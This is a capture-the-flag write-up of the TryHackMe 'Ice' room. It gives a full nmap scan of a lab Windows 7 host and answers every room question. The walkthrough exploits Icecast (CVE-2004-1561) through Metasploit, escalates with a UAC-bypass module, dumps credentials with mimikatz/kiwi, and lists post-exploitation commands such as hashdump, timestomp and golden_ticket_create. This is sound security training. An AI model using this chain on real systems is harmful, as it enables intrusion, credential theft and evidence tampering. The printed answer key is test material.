Ice | THM | Vishakhan Pillai | 27/05/2025

```bash
export IP=10.10.38.26
```

## nmap Scan
```
# Nmap 7.95 scan initiated Tue May 27 23:28:06 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap/initial -vv 10.10.38.26
Increasing send delay for 10.10.38.26 from 0 to 5 due to 162 out of 539 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 5 to 10 due to 11 out of 29 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 10 to 20 due to 11 out of 29 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 20 to 40 due to 11 out of 21 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 40 to 80 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 80 to 160 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 160 to 320 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 320 to 640 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.10.38.26 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.38.26
Host is up, received reset ttl 124 (0.22s latency).
Scanned at 2025-05-27 23:28:07 IST for 453s
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 124 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack ttl 124 Microsoft Terminal Service
|_ssl-date: 2025-05-27T18:04:17+00:00; -53s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-05-26T17:55:36
| Not valid after:  2025-11-25T17:55:36
| MD5:   7d73:fba1:c66d:868e:2431:3aa8:4d23:d232
| SHA-1: 4086:6072:40ea:502b:580a:7135:c336:f32d:b596:c650
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQZN5HQTncrJRH7FeapPlIXjANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTI1MDUyNjE3NTUzNloXDTI1MTEyNTE3NTUz
| NlowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAOEJ4TylBUDtBUZZ9ThG/F6qIYutbVIvqE+NlsilLLcmgHSgZVYIJfog
| TUq/7gMnnmq9wFt5QAbp18AkTOsMYdfLi0Fma0tc1QwUIM2Yf5jxf67RDFfnf33D
| +aKik7cN/S5k6GEbkxcLoOl5FTyDxjb51Jg4T+CMM2aAJVWxIwK07Wrb0Sm68js7
| 7KC8/jnDbofJF09l8nPMZb7LfX7Ai63vHyJA1GJRwBsknaP8v+YvlmilrWCBawMX
| Y/zf15RHT6Y8QR4RqnXxCFgPj5e7QeKNgyrCz588U/KCicDYISAIY/w7beQ+JIaP
| K7/ff3ZEAPPEcSsjfI7Wug2raJFSuIcCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQBNJo3Xs/B2zDpC
| IJfKqb36Lq8oUVxbkrzbZwkfBFf10kU4yOMy3v2mMzFSR1MJSlyqjG5vGummcjOZ
| 0Ut1yZSN7eJnKpKB5Km+UNRuiA9K/le3RAEOZOotBh6UPHm+MxV0/UXJwS4ICYEA
| vzFr9T5CBO+AF7M4rbFaxq/FrbkQe2e6mk3P72dh5pFbrTYVj06LbnaeYanx2sEo
| 29Iu0eBJBJLz0RgJp356j6SfioPkPIwe6+Jljnaqh4WIen+rJoVtWeAx5XXiIPot
| bfnXoTu135nkT61kTyg3VJQrzqd0ZZGP2uPJ9WHwWSzRKtpKuMV7zFF9heotQ24U
| hEcaqRIg
|_-----END CERTIFICATE-----
5357/tcp  open  http          syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 124 Icecast streaming media server
| http-methods: 
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49158/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49159/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49160/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-27T18:04:13
|_  start_date: 2025-05-27T17:55:35
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ec:b9:0c:24:53 (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02:ec:b9:0c:24:53:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-27T13:04:13-05:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11728/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14691/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 20503/udp): CLEAN (Timeout)
|   Check 4 (port 20436/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h14m09s, deviation: 2h30m01s, median: -50s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 27 23:35:40 2025 -- 1 IP address (1 host up) scanned in 453.75 seconds
```

##  Task 2 - Recon

1. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?
```
3389
```

2. What service did nmap identify as running on port 8000? (First word of this service)
```
Icecast
```

3. What does Nmap identify as the hostname of the machine? (All caps for the answer)
```
DARK-PC
```

## Task 3- Gain Access

1. Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use https://www.cvedetails.com for this question and the next.

```
6.4
```

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
```
CVE-2004-1561 
```
3. Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`
```
no answer needed
```

4. After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module.
```
exploit/windows/http/icecast_header
```

5. Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.
```
No answer needed
```

6. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
```
RHOSTS
```

7. First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`
```
No answer needed
```

## Task 4 - Escalate

1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

```
meterpreter
```

2. What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module.
```
dark
```

3. What build of Windows is the system?
```
7601
```

4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
```
x64
```

5. Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
```
no answer needed
```

6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
```
exploit/windows/local/bypassuac_eventvwr
```
7. Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shel

```
no answer needed
```

8. Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`
```
no answer needed
```

9. Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
```
no answer needed
```

10. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
```
lhost
```

11. Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`
```
no answer needed
```

12. After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 
```
no answer needed
```

13. Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`
```
no answer needed
```

14. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
```
SeTakeOwnershipPrivilege
```

## Task 5 - Looting

1. Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).
```
no answer needed
```

2. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
```
spoolsv.exe
```

3. Migrate to this process now with the command `migrate -N PROCESS_NAME`
```
no answer needed
```

4. Let's check what user we are now with the command `getuid`. What user is listed?
```
NT AUTHORITY\SYSTEM
```

5. Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
```
no answer needed
```

6. Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 
```
no answer needed
```

7. Which command allows up to retrieve all credentials?
```
creds_all
```

8. Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
```
Password01
```

## Task 6 - Post Exploitation

1. Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.
```
no answer needed
```

2. What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
```
hashdump
```

3. While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
```
screenshare
```

4. How about if we wanted to record from a microphone attached to the system?
```
record_mic
```

5. To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
```
timestomp
```

6. Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

```
golden_ticket_create
```

7. One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`
```
no answer needed
```





























